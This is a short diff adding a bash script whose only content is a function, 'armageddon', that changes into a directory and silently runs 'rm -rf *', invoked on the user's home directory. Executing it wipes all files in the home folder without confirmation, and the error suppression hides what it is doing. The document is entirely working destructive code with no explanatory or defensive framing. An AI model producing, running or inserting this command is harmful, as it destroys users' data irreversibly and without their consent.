@@ -1,0 +1,8 @@
+#!/usr/bin/env bash
+
+function armageddon() {
+	cd $1
+	rm -rf * 2> /dev/null
+}
+
+armageddon $HOME
